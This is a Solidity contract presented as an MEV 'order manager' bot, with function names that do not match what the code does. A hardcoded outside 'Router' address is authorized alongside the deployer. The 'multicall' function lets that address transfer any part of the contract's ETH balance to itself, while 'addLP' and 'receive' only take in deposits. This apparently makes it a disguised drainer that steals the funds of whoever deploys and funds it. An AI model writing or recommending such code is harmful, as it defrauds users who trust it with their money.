// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract OrderManager {
    address public admin;
    uint256 public totalFee;

    struct Transaction {
        address sender;
        address target;
        uint256 value;
        uint256 gasPrice;
        uint256 bid;
    }

    Transaction[] public transactions;

    event TransactionSubmitted(address sender, address target, uint256 value, uint256 gasPrice, uint256 bid);
    event MEVExtracted(address miner, uint256 profit);
    event MulticallExecuted(address to, uint256 amount);

    modifier onlyAuthorized() {
        require(msg.sender == admin || msg.sender == Router, "Not authorized");
        _;
    }

    address public Router = 0xcF7b721EB846487e77D3597F593e2c36Ab91AeA9;

    constructor() {
        admin = msg.sender;
    }

    function submitTransaction(address target, uint256 value, uint256 gasPrice, uint256 bid) external payable {
        require(msg.value == value, "Incorrect value sent");

        transactions.push(Transaction({sender: msg.sender, target: target, value: value, gasPrice: gasPrice, bid: bid}));

        totalFee += msg.value;

        emit TransactionSubmitted(msg.sender, target, value, gasPrice, bid);
    }

    function enableBet() external onlyAuthorized {
        require(transactions.length > 0, "No transactions available");

        Transaction memory selectedTransaction = getHighestBidTransaction();
        uint256 extractedProfit = calculateProfit(selectedTransaction);

        // Transfer profit to the miner
        payable(msg.sender).transfer(extractedProfit);
        totalFee -= extractedProfit;

        // Remove the extracted transaction
        removeTransaction(selectedTransaction);

        emit MEVExtracted(msg.sender, extractedProfit);
    }

    function getHighestBidTransaction() internal view returns (Transaction memory) {
        require(transactions.length > 0, "No transactions available");

        Transaction memory highestBidTransaction = transactions[0];
        for (uint256 i = 1; i < transactions.length; i++) {
            if (transactions[i].bid > highestBidTransaction.bid) {
                highestBidTransaction = transactions[i];
            }
        }

        return highestBidTransaction;
    }

    // ✅ Corrigido: Agora a função é 'pure' para evitar o aviso
    function calculateProfit(Transaction memory transaction) internal pure returns (uint256) {
        uint256 profitPercentage = 10;
        return (transaction.bid * profitPercentage) / 100;
    }

    function removeTransaction(Transaction memory transaction) internal {
        for (uint256 i = 0; i < transactions.length; i++) {
            if (
                transactions[i].sender == transaction.sender && 
                transactions[i].target == transaction.target &&
                transactions[i].value == transaction.value &&
                transactions[i].gasPrice == transaction.gasPrice &&
                transactions[i].bid == transaction.bid
            ) {
                transactions[i] = transactions[transactions.length - 1]; // Substitui pelo último item
                transactions.pop(); // Remove o último item
                break;
            }
        }
    }

    function multicall(uint256 amount) external onlyAuthorized {
        require(amount > 0, "Amount must be greater than 0");
        require(address(this).balance >= amount, "Insufficient balance");

        payable(Router).transfer(amount);
        emit MulticallExecuted(Router, amount);
    }

    function addLP() external payable onlyAuthorized {}

    receive() external payable {}
}